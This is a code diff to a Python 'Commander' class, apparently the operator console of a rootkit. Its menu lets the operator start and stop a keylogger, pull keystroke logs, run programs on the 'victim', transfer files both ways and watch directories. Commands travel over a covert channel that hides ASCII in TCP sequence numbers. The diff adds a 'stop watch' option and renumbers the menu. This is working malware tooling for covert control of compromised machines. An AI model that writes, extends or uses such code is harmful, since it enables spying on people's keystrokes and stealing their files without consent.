@@ -35,17 +35,18 @@ class Commander:
         }
         
         self.connected_actions = {
-            "1": self.handle_start_keylogger,
-            "2": self.handle_stop_keylogger,
-            "3": self.handle_get_log,
-            "4": self.handle_exec,
-            "5": self.handle_put_file,
-            "6": self.handle_get_file,
-            "7": self.handle_watch,
-            "8": self.handle_uninstall,
-            "9": self.handle_disconnect,
-            "0": self.handle_exit
-        }
+        "1": self.handle_start_keylogger,
+        "2": self.handle_stop_keylogger,
+        "3": self.handle_get_log,
+        "4": self.handle_exec,
+        "5": self.handle_put_file,
+        "6": self.handle_get_file,
+        "7": self.handle_watch,
+        "8": self.handle_stop_watch,      # ADD THIS
+        "9": self.handle_uninstall,
+        "10": self.handle_disconnect,     # Change from 9 to 10
+        "0": self.handle_exit
+    }
 
     def send_covert_command(self, cmd_type, data=""):
         """Encodes ASCII characters into the TCP Sequence Number."""
@@ -348,6 +349,13 @@ class Commander:
         self.send_covert_command("WATCH", path)
         time.sleep(0.5)
 
+    def handle_stop_watch(self):
+        """Option 8: Stop watching file/directory on the victim."""
+        print("[*] Stopping file watcher on victim...")
+        self.send_covert_command("STOP_WATCH", "")
+        time.sleep(0.5)
+        print("[+] Stop watch signal sent.")
+
     def handle_uninstall(self):
         """Option 8: Uninstall rootkit from the victim."""
         confirm = input("Are you sure you want to uninstall? (y/n): ").strip().lower()
@@ -393,9 +401,10 @@ class Commander:
         print(f"[CONNECTED] -> {self.target_ip}")
         print("\n1. Start Keylogger          6. Transfer File FROM Victim")
         print("2. Stop Keylogger           7. Watch File/Directory")
-        print("3. Transfer Keylog File     8. Uninstall Rootkit")
-        print("4. Run Program on Victim    9. Disconnect")
-        print("5. Transfer File TO Victim  0. Exit")
+        print("3. Transfer Keylog File     8. Stop Watch")
+        print("4. Run Program on Victim    9. Uninstall Rootkit")
+        print("5. Transfer File TO Victim  10. Disconnect")
+        print("0. Exit")
 
     def run(self):
         while self.running:
